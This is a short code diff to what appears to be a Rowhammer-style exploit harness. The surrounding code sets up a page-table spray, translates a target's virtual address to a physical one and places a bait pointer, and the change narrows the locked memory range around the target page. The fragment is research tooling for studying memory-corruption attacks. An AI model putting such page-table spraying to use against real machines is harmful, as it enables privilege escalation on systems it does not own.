@@ -31,7 +31,7 @@ int main() {
 
         void* pageblock = get_page_block();
         void* target = (void*)((unsigned long)pageblock + TARGET_OFFSET);
-        mlock((void*)((unsigned long)target - PAGE_SIZE), 3 * PAGE_SIZE);
+        mlock((void*)(unsigned long)target, PAGE_SIZE);
 
         int fd_shm = open("/dev/shm", O_TMPFILE | O_RDWR, S_IRUSR | S_IWUSR);
         write(fd_shm, buf, 8);
@@ -43,7 +43,6 @@ int main() {
         unsigned long target_phys = rubench_va_to_pa(target);
 
         void* bait_ptr = (void*)((unsigned long)pageblock + PAGEBLOCK_SIZE / 2);
-
         auto spray_args = pt_spray_args_t{
             .start = (void*)SPRAY_START,
             .fd = fd_shm,
@@ -81,7 +80,7 @@ int main() {
         munlock(file_ptr, PAGE_SIZE);
         munmap(file_ptr, PAGE_SIZE);
         close(fd_shm);
-        munlock((void*)((unsigned long)target - PAGE_SIZE), 3 * PAGE_SIZE);
+        munlock((void*)(unsigned long)target, PAGE_SIZE);
         munmap(pageblock, PAGEBLOCK_SIZE);
     }
 
